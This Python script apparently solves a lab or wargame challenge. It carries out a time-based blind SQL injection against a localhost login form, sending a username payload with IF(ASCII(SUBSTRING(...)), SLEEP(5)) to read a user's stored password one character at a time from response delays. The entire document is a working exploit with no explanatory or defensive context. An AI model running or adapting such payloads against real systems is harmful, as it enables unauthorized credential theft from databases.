import time
from string import ascii_lowercase, ascii_uppercase, digits

import requests
from requests.auth import HTTPBasicAuth

url = "http://localhost/"
auth = HTTPBasicAuth("user", "password")
charset = ascii_lowercase + ascii_uppercase + digits
password = ""

for position in range(1, 33):
    for char in charset:
        payload = f'user" AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username="user"), {position}, 1)) = ASCII("{char}"), SLEEP(5), 0) #'
        data = {"username": payload}
        start_time = time.time()
        try:
            reponse = requests.post(url=url, auth=auth, data=data, timeout=10)
        except requests.exceptions.Timeout:
            pass
        end_time = time.time()

        if end_time - start_time > 5:
            password += char
            print(f"[+] Position {position}: {char} -> Mot de passe actuel: {password}")
            break

print(password)
